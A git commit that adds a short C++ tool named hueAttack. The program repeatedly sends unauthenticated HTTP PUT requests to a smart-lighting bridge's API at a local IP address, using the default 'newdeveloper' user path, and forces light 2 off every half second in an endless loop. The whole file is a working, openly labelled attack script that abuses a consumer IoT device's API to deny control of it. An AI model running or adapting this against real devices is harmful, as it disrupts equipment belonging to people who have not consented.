68c0d4a9bbe5d5cc86a75f7ac96f100b922256ce
Bardo91 <19Bardo91@gmail.com>
2015-07-16 14:51:10 +0200

    Codded attacker

---
+++ tools/hueAttack/main.cpp
@@ -0,0 +1,30 @@
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//
+// DMC_NODE
+//
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+#include <iostream>
+#include <Poco/Net/HTTPRequest.h>
+#include <Poco/Net/HTTPClientSession.h>
+
+using namespace Poco::Net;
+
+int main(int, const char**) {
+	
+	std::cout << "Starting attack" << std::endl;
+	
+	HTTPClientSession session("10.100.3.211");
+	HTTPRequest cmdOff;
+	cmdOff.setMethod("PUT");
+	cmdOff.setURI("/api/newdeveloper/lights/2/state");
+	std::string body = "{\n\t\"on\": false\n}";
+	cmdOff.setContentLength(body.size());
+
+	for (;;) {
+		session.sendRequest(cmdOff) << body;
+		Sleep(500);
+	}
+	
+
+}
